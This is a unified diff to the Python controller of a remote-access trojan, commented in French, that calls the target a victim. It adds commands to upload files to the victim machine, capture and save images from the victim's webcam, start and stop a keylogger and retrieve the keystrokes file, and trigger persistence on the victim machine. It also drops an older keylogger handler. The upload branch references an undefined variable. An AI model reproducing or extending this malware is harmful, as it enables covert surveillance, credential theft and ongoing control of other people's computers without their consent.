@@ -8,6 +8,7 @@ import os
 s = None
 target = None
 ip = None
+reper = os.getcwd()
 
 
 #la fonction pour etablire la connexion avec la machine vicitme
@@ -55,6 +56,7 @@ def receive():
 
 #la fonction global qui possede les appelles aux fonction declarer dans le haut + possede les fonctionaliter de trojan ...
 def shell():
+    global reper
     try:
         while True:
             #un simple affichage 
@@ -77,6 +79,7 @@ def shell():
             elif command.strip() == "cd":  # Vérifier le répertoire courant
                 sending(command)
                 response = receive()  # Recevoir le répertoire courant
+                reper=response
                 print(f"Current directory: {response}")
                 continue
             
@@ -115,31 +118,79 @@ def shell():
                     print(f"Error downloading file: {response.get('message')}")
                 continue
             
-            elif command.strip() == "keylogger":
-                sending(command)  # Envoie la commande au client
-                response = receive()  # Reçoit les touches du client
-                if response.get("status") == "success":
-                    print(f"Captured keystrokes:\n{response.get('data')}")
-                else:
-                    print("Failed to retrieve keystrokes.")
-                continue
-
-
-           
            #la commande pour puise uploader des fichier dans la machine de vicitime 
             elif command.startswith("upload "):
                 try:
+                # Récupérer le chemin spécifié par l'utilisateur
                     filepath = command.split(" ", 1)[1]
+        
+                # Ajouter le répertoire courant s'il s'agit d'un chemin relatif
+                    if not os.path.isabs(filepath):
+                        filepath = os.path.join(reper, filepath)
+                    else: 
+                        filepath = filename
+                # Debug : Afficher le chemin réel utilisé
+                    print(f"Attempting to upload file from: {filepath}")
+        
+                # Vérifier si le fichier existe
+                    if not os.path.exists(filepath):
+                        print(f"File '{filepath}' does not exist.")
+                        continue
+        
+        # Lire le fichier
                     with open(filepath, "rb") as f:
                         filedata = f.read().hex()
+        
+                    # Envoyer au client
                     sending(f"upload {filepath} {filedata}")
                     response = receive()
                     print(response)
-                except FileNotFoundError:
-                    print("File not found locally.")
                 except Exception as e:
                     print(f"Error uploading file: {str(e)}")
                 continue
+            
+            elif command.strip() == "camera":
+                sending(command)  # Send the camera command to the client
+                response = receive()  # Receive the status message from the client
+                if isinstance(response, dict) and response.get("status") == "success":
+                    image_data = bytes.fromhex(response.get("data"))
+                    image_path = "Victime_image.png"
+                    with open("C:\\Users\\HP\\OneDrive\\Desktop\\Victime_image.png", "wb") as f:
+                        f.write(image_data)
+                    print(f"Image successfully saved as {image_path}.")
+                else:
+                    print(f"Failed to capture image: {response}")
+                continue
+            
+            elif command.strip() == "keylogger start":
+                # Envoi de la commande pour démarrer l'enregistrement des touches
+                sending(command)
+                response = receive()  # Réponse du client
+                print(response)  # Afficher le message de statut
+                continue
+            
+            elif command.strip() == "keylogger stop":
+                sending(command)  # Envoyer la commande pour arrêter le keylogger
+                response = receive()  # Réponse du client avec les données du fichier
+                if isinstance(response, dict) and response.get("status") == "success":
+                # Décoder les données hexadécimales et sauvegarder le fichier
+                    file_data = bytes.fromhex(response.get("data"))
+                    file_path = os.path.join(os.path.expanduser("~"), "Desktop", "keystrokes_received.txt")
+                    with open(file_path, "wb") as f:
+                        f.write(file_data)
+                    print(f"Keystrokes file saved at: {file_path}")
+                else:
+                    print(f"Failed to receive keystrokes file: {response.get('message')}")
+                    continue
+            
+            # Code côté serveur pour envoyer la commande persistance
+            elif command.strip() == "persistance":
+                sending(command)  # Envoyer la commande au client pour qu'il configure la persistance
+                response = receive()  # Attendre la réponse du client (statut)
+                print(response)  # Afficher si la persistance a été configurée avec succès
+                continue
+
+
 
 
             # Envoyer d'autres commandes au client
